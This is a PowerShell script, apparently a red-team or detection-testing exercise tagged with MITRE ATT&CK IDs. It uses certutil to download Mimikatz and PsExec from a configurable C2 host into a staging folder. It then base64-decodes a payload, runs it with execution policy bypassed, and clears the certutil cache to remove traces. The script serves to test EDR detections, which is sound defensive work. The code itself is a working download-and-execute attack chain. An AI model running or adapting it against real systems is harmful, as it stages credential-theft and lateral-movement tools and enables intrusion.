$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting LOLBin Download Chain - certutil..." -ForegroundColor Cyan

# T1105 - Ingress Tool Transfer via certutil
# T1218 - Signed Binary Proxy Execution
# certutil.exe is a legitimate Windows certificate utility abused to download files

Write-Host "[*] [T1105] certutil download - this triggers LOLBin detections" -ForegroundColor Yellow
Write-Host "[!] C2 Server: http://$C2Host/tools/" -ForegroundColor Yellow

# Create staging directory
$stagingDir = "C:\temp\staging"
Write-Host "`n[*] Creating staging directory: $stagingDir"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Download Mimikatz via certutil
Write-Host "`n[*] [T1105] Downloading mimikatz.exe via certutil..."
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/mimikatz.exe $stagingDir\mimikatz.exe"
certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" "$stagingDir\mimikatz.exe"
if (Test-Path "$stagingDir\mimikatz.exe") {
    Write-Host "    [+] Download successful: $stagingDir\mimikatz.exe" -ForegroundColor Green
} else {
    Write-Host "    [-] Download failed (ensure C2 is hosting the file)" -ForegroundColor Red
}

# Download PsExec via certutil
Write-Host "`n[*] [T1105] Downloading PsExec.exe via certutil..."
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/PsExec.exe $stagingDir\PsExec.exe"
certutil -urlcache -split -f "http://$C2Host/tools/PsExec.exe" "$stagingDir\PsExec.exe"
if (Test-Path "$stagingDir\PsExec.exe") {
    Write-Host "    [+] Download successful: $stagingDir\PsExec.exe" -ForegroundColor Green
} else {
    Write-Host "    [-] Download failed (ensure C2 is hosting the file)" -ForegroundColor Red
}

# Download encoded payload and decode (additional LOLBin trigger)
Write-Host "`n[*] [T1140] Attempting base64 decode via certutil..."
$b64payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Write-Host 'Payload decoded and executed successfully'"))
$b64payload | Out-File "$stagingDir\payload.b64" -Encoding ASCII
Write-Host "    CMD: certutil -decode $stagingDir\payload.b64 $stagingDir\payload.ps1"
certutil -decode "$stagingDir\payload.b64" "$stagingDir\payload.ps1"
if (Test-Path "$stagingDir\payload.ps1") {
    Write-Host "    [+] Decode successful" -ForegroundColor Green
    powershell -ExecutionPolicy Bypass -File "$stagingDir\payload.ps1"
}

# Clear certutil URL cache (cleanup)
Write-Host "`n[*] Clearing certutil URL cache..."
certutil -urlcache * delete 2>$null

Write-Host "`n[+] LOLBin Download Chain (certutil) Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for detections on: certutil downloading executables" -ForegroundColor Yellow
